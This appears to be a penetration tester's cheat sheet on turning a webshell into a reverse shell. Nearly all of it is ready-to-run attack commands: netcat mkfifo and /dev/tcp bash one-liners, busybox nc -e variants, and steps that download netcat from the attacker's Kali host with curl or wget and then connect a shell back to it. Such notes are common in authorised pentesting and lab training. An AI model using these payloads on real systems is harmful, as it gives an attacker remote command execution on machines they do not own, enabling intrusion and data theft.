If we have a webshell there are 2 ways we can turn it into a reverse shell:

> 1: Check what is available on the target machine then use the associated one liner:

```
which python
which python3 
which bash
which perl
which php
which nc 
which ncat
where powershell (if its a windows machine)
```

whichever one you find you can run the reverse shell script from here: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

> If the target machine has nc available then consider trying these 3 first:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <kali_ip> <port> >/tmp/f
```

```
sh -i >& /dev/tcp/<kali_ip>/<port> 0>&1
```

```
/bin/bash -c "bash -i >& /dev/tcp/<kali_ip>/<port> 0>&1"
```

> If these dont work then try these versions of busybox:

```
busybox nc <kali_ip> <port> -e sh
busybox nc <kali_ip> <port> -e /bin/sh
busybox nc <kali_ip> <port> -e /bin/bash
```

> You can transfer netcat over to the machine then use that to create a reverse shell connection:

For Windows:

```
on kali: python -m http.server 80
on webshell: curl http://<kali_ip>/nc.exe -o nc.exe
on kali: rlwrap nc -nvlp <port>
on webshell: nc.exe <kali_ip> <port> -e cmd.exe 
```

For Linux:

```
on kali: python -m http.server 80
on webshell: cd /tmp, wget http://<kali_ip>/nc
on kali: rlwrap nc -nvlp <port>
on webshell: nc <kali_ip> <port> -e /bin/bash
```

For getting a windows reverse shell from a webshell, powershell #3 in base64 will work most of the time from revshells.com 